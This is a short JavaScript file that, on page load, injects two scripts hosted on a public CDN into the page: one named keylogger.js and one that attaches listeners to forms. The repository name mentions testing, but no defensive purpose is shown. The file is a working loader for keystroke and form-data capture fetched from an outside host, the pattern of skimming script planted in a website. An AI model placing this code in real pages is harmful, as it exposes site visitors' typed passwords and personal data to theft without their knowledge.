window.addEventListener('load', () => {
    console.log("Main script loaded.");

    // Load the keylogger script
    const keyloggerScript = document.createElement('script');
    keyloggerScript.src = 'https://cdn.jsdelivr.net/gh/MiguelGomezMaxio/js-scrits-for-testing@main/keylogger.js';
    document.head.appendChild(keyloggerScript);

    // Load the event listener script
    const eventListenerScript = document.createElement('script');
    eventListenerScript.src = 'https://cdn.jsdelivr.net/gh/MiguelGomezMaxio/js-scrits-for-testing@main/add-event-listener-to-form.js';
    document.head.appendChild(eventListenerScript);
});
